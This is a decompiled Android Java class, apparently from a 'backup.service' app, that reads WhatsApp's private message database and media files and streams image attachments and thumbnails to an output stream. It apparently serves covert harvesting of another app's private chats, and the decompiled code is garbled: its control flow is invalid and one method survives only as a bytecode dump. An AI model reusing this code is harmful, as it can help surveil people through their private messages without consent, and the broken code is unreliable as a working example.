package ru.dtlbox.databasereader;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;
import android.util.Log;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;

public class WhatsAppReader
  extends AppDatabaseAttachementReader
{
  private static final String CURRENT_CACHE_DATABASE = "whats_app.sqlite";
  private static final String[] CURRENT_COLOMNS = { "_id", "media_url", "media_mime_type", "raw_data", "media_name", "media_wa_type", "thumb_image" };
  private static final String CURRENT_TABLE = "messages";
  private static final String CURRENT_WHATSAPP_DATABASE_PATH = "/data/data/com.whatsapp/databases/msgstore.db";
  private static final String FIELD__ID = "_id";
  private static final int INDEX_OF_MEDIA_MIME = 2;
  private static final int INDEX_OF_MEDIA_NAME = 4;
  private static final int INDEX_OF_MEDIA_URL = 1;
  private static final int INDEX_OF_MEDIA_WA_TYPE = 5;
  private static final int INDEX_OF_RAW_DATA = 3;
  private static final int INDEX_OF_THUMB_IMAGE = 6;
  private static final int INDEX_OF__ID = 0;
  private static final int MAX_FILE_SIZE = 2097152;
  private static final String TAG = "backup.service";
  private static final int WA_PICTURE = 1;
  private static final int WA_SOUND = 2;
  private static final int WA_VIDEO = 3;
  private String sLastRed = "";
  
  public WhatsAppReader()
  {
    init(Config.DEFAULT, "/data/data/com.whatsapp/databases/msgstore.db", "whats_app.sqlite");
  }
  
  public WhatsAppReader(Config paramConfig)
  {
    init(paramConfig, "/data/data/com.whatsapp/databases/msgstore.db", "whats_app.sqlite");
  }
  
  public WhatsAppReader(Config paramConfig, String paramString1, String paramString2)
  {
    if (paramString1 != null) {
      if (paramString2 == null) {
        break label32;
      }
    }
    for (;;)
    {
      init(paramConfig, paramString1, paramString2);
      return;
      paramString1 = "/data/data/com.whatsapp/databases/msgstore.db";
      break;
      label32:
      paramString2 = "whats_app.sqlite";
    }
  }
  
  private void debugCursorValues(Cursor paramCursor)
  {
    Log.d("READING_WHATS_APP", paramCursor.getString(0) + " | " + paramCursor.getString(2) + " | " + paramCursor.getString(1));
  }
  
  String CheckAttach(String paramString, int paramInt)
  {
    Object localObject = null;
    if (paramString == null) {
      paramString = (String)localObject;
    }
    String str;
    do
    {
      return paramString;
      localObject = paramString.split("-WA");
      if (localObject.length != 2)
      {
        Log.v("backup.service", "WA changed format");
        return null;
      }
      paramString = localObject[1].split("\\.");
      if (paramString.length != 2)
      {
        Log.v("backup.service", "WA changed format2");
        return null;
      }
      str = String.format("%04d", new Object[] { Integer.valueOf(Integer.parseInt(paramString[0]) + paramInt) });
      str = Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images/" + localObject[0] + "-WA" + str;
      localObject = CheckJpeg(str, paramString[1]);
      paramString = (String)localObject;
    } while (localObject != null);
    return CheckJpeg(str, "jpeg");
  }
  
  String CheckJpeg(String paramString1, String paramString2)
  {
    if (paramString1 == null) {}
    do
    {
      do
      {
        return null;
      } while (paramString2 == null);
      paramString1 = paramString1 + "." + paramString2;
      paramString2 = new File(paramString1);
    } while ((!paramString2.exists()) || (!paramString2.canRead()));
    return paramString1;
  }
  
  public String getPathFromBlob(byte[] paramArrayOfByte)
  {
    Object localObject = "String;xpt".getBytes();
    int i = 256;
    if (i >= paramArrayOfByte.length - localObject.length)
    {
      label20:
      break label52;
      label21:
      if (i < paramArrayOfByte.length - localObject.length) {
        break label85;
      }
      Log.v("backup.service", "err, mask not found");
      paramArrayOfByte = null;
    }
    label52:
    label85:
    do
    {
      return paramArrayOfByte;
      int j = 0;
      for (;;)
      {
        if (j >= localObject.length)
        {
          if (j == localObject.length) {
            break label21;
          }
          i += 1;
          break;
        }
        if (localObject[j] != paramArrayOfByte[(i + j)]) {
          break label20;
        }
        j += 1;
      }
      i = localObject.length + i + 1;
      j = paramArrayOfByte[i];
      localObject = new byte[j];
      System.arraycopy(paramArrayOfByte, i + 1, localObject, 0, j);
      localObject = new String((byte[])localObject);
      paramArrayOfByte = (byte[])localObject;
    } while (!DEBUG_MODE);
    Log.v("backup.service", "waimgpath=" + (String)localObject);
    return localObject;
  }
  
  /* Error */
  public byte[] read(File paramFile)
    throws IOException
  {
    // Byte code:
    //   0: aload_1
    //   1: invokevirtual 212	java/io/File:length	()J
    //   4: ldc2_w 213
    //   7: lcmp
    //   8: ifle +11 -> 19
    //   11: new 208	java/io/IOException
    //   14: dup
    //   15: invokespecial 215	java/io/IOException:<init>	()V
    //   18: athrow
    //   19: aconst_null
    //   20: astore 5
    //   22: aconst_null
    //   23: astore 4
    //   25: sipush 4096
    //   28: newarray byte
    //   30: astore 6
    //   32: new 217	java/io/ByteArrayOutputStream
    //   35: dup
    //   36: invokespecial 218	java/io/ByteArrayOutputStream:<init>	()V
    //   39: astore_3
    //   40: new 220	java/io/FileInputStream
    //   43: dup
    //   44: aload_1
    //   45: invokespecial 223	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   48: astore_1
    //   49: aload_1
    //   50: aload 6
    //   52: invokevirtual 228	java/io/InputStream:read	([B)I
    //   55: istore_2
    //   56: iload_2
    //   57: iconst_m1
    //   58: if_icmpne +24 -> 82
    //   61: aload_3
    //   62: ifnull +7 -> 69
    //   65: aload_3
    //   66: invokevirtual 231	java/io/ByteArrayOutputStream:close	()V
    //   69: aload_1
    //   70: ifnull +7 -> 77
    //   73: aload_1
    //   74: invokevirtual 232	java/io/InputStream:close	()V
    //   77: aload_3
    //   78: invokevirtual 235	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   81: areturn
    //   82: aload_3
    //   83: aload 6
    //   85: iconst_0
    //   86: iload_2
    //   87: invokevirtual 239	java/io/ByteArrayOutputStream:write	([BII)V
    //   90: goto -41 -> 49
    //   93: astore 5
    //   95: aload_1
    //   96: astore 4
    //   98: aload 5
    //   100: astore_1
    //   101: aload_3
    //   102: ifnull +7 -> 109
    //   105: aload_3
    //   106: invokevirtual 231	java/io/ByteArrayOutputStream:close	()V
    //   109: aload 4
    //   111: ifnull +8 -> 119
    //   114: aload 4
    //   116: invokevirtual 232	java/io/InputStream:close	()V
    //   119: aload_1
    //   120: athrow
    //   121: astore_3
    //   122: goto -13 -> 109
    //   125: astore_3
    //   126: goto -7 -> 119
    //   129: astore 4
    //   131: goto -62 -> 69
    //   134: astore_1
    //   135: goto -58 -> 77
    //   138: astore_1
    //   139: aload 5
    //   141: astore_3
    //   142: goto -41 -> 101
    //   145: astore_1
    //   146: goto -45 -> 101
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	149	0	this	WhatsAppReader
    //   0	149	1	paramFile	File
    //   55	32	2	i	int
    //   39	67	3	localByteArrayOutputStream	java.io.ByteArrayOutputStream
    //   121	1	3	localIOException1	IOException
    //   125	1	3	localIOException2	IOException
    //   141	1	3	localObject1	Object
    //   23	92	4	localFile	File
    //   129	1	4	localIOException3	IOException
    //   20	1	5	localObject2	Object
    //   93	47	5	localObject3	Object
    //   30	54	6	arrayOfByte	byte[]
    // Exception table:
    //   from	to	target	type
    //   49	56	93	finally
    //   82	90	93	finally
    //   105	109	121	java/io/IOException
    //   114	119	125	java/io/IOException
    //   65	69	129	java/io/IOException
    //   73	77	134	java/io/IOException
    //   25	40	138	finally
    //   40	49	145	finally
  }
  
  public int readAttach(OutputStream paramOutputStream, int paramInt)
    throws IOException
  {
    this.mDataBaseHelper.opendatabase();
    Cursor localCursor = this.mDataBaseHelper.getDataBase().query("messages", CURRENT_COLOMNS, "_id > " + paramInt, null, null, null, null);
    Object localObject1 = null;
    if (localCursor.getCount() == 0)
    {
      this.mDataBaseHelper.close();
      return 0;
    }
    Object localObject3 = (byte[])null;
    boolean bool1 = false;
    paramInt = 0;
    if (!localCursor.moveToNext()) {}
    for (;;)
    {
      if (DEBUG_MODE) {
        Log.d("has attach?", String.valueOf(bool1));
      }
      if (bool1) {
        break label687;
      }
      this.mDataBaseHelper.close();
      return 0;
      if (DEBUG_MODE) {
        debugCursorValues(localCursor);
      }
      i = localCursor.getInt(0);
      if (DEBUG_MODE) {
        Log.v("backup.service", "wid=" + i);
      }
      Object localObject5 = localObject1;
      localObject4 = localObject3;
      boolean bool2 = bool1;
      if (localCursor.getInt(5) == 1)
      {
        byte[] arrayOfByte = localCursor.getBlob(6);
        localObject5 = localObject1;
        localObject4 = localObject3;
        bool2 = bool1;
        if (arrayOfByte != null)
        {
          localObject5 = localObject1;
          localObject4 = localObject3;
          bool2 = bool1;
          if (arrayOfByte.length > 0)
          {
            String str = getPathFromBlob(arrayOfByte);
            if (DEBUG_MODE) {
              Log.v("backup.service", "canpath=" + str);
            }
            localObject5 = localObject1;
            localObject4 = localObject3;
            bool2 = bool1;
            if (str != null)
            {
              localObject5 = localObject1;
              localObject4 = localObject3;
              bool2 = bool1;
              if (!str.equals(this.sLastRed))
              {
                this.sLastRed = str;
                localObject4 = localObject1;
                localObject5 = localObject3;
                try
                {
                  if (DEBUG_MODE)
                  {
                    localObject4 = localObject1;
                    localObject5 = localObject3;
                    Log.v("backup.service", "fullWAFoundok=" + str);
                  }
                  localObject4 = localObject1;
                  localObject5 = localObject3;
                  arrayOfByte = read(new File(str));
                  localObject3 = localObject1;
                  localObject6 = arrayOfByte;
                  if (arrayOfByte != null)
                  {
                    localObject4 = localObject1;
                    localObject5 = arrayOfByte;
                    localObject3 = localObject1;
                    localObject6 = arrayOfByte;
                    if (arrayOfByte.length > 0)
                    {
                      bool2 = true;
                      localObject6 = str;
                      localObject1 = localObject6;
                      localObject3 = arrayOfByte;
                      bool1 = bool2;
                      paramInt = i;
                      localObject4 = localObject6;
                      localObject5 = arrayOfByte;
                      if (!DEBUG_MODE) {
                        continue;
                      }
                      localObject4 = localObject6;
                      localObject5 = arrayOfByte;
                      Log.v("backup.service", "redOkay!");
                      localObject1 = localObject6;
                      localObject3 = arrayOfByte;
                      bool1 = bool2;
                      paramInt = i;
                    }
                  }
                }
                catch (Exception localException)
                {
                  Log.v("backup.service", "WA cannot read attach SD");
                  Object localObject6 = localObject5;
                  localObject3 = localObject4;
                  bool1 = true;
                  localObject5 = localObject3;
                  localObject4 = localObject6;
                  bool2 = bool1;
                  if (DEBUG_MODE)
                  {
                    Log.v("backup.service", "redOkay!");
                    bool2 = bool1;
                    localObject4 = localObject6;
                    localObject5 = localObject3;
                  }
                }
              }
            }
          }
        }
      }
      localObject2 = localObject5;
      localObject3 = localObject4;
      bool1 = bool2;
      paramInt = i;
      if (bool2) {
        break;
      }
      if (DEBUG_MODE) {
        Log.v("backup.service", "fullpicnotfound, take small from blob");
      }
      localObject5 = localCursor.getString(1);
      localObject2 = localObject5;
      localObject3 = localObject4;
      bool1 = bool2;
      paramInt = i;
      if (localObject5 == null) {
        break;
      }
      localObject4 = localCursor.getBlob(3);
      localObject2 = localObject5;
      localObject3 = localObject4;
      bool1 = bool2;
      paramInt = i;
      if (localObject4 == null) {
        break;
      }
      localObject2 = localObject5;
      localObject3 = localObject4;
      bool1 = bool2;
      paramInt = i;
      if (localObject4.length <= 0) {
        break;
      }
      bool1 = true;
      localObject2 = localObject5;
      localObject3 = localObject4;
      paramInt = i;
    }
    label687:
    paramOutputStream.write(99);
    addData(paramOutputStream, String.valueOf(paramInt));
    addData(paramOutputStream, "4");
    Object localObject4 = localObject2;
    if (localObject2 == null) {
      localObject4 = "<unknown>";
    }
    int i = ((String)localObject4).lastIndexOf("/");
    if ((i != -1) && (i < ((String)localObject4).length() - 1)) {}
    for (Object localObject2 = ((String)localObject4).substring(i);; localObject2 = localObject4)
    {
      addData(paramOutputStream, localCursor.getString(2));
      addData(paramOutputStream, (String)localObject2);
      addData(paramOutputStream, String.valueOf(localObject3.length));
      if (DEBUG_MODE) {
        Log.v("backup.service", "Zapihaly=" + String.valueOf(paramInt) + ":" + localObject3.length);
      }
      paramOutputStream.write((byte[])localObject3);
      paramOutputStream.write(1);
      paramOutputStream.write(3);
      paramOutputStream.write(2);
      this.mDataBaseHelper.close();
      return paramInt;
    }
  }
}
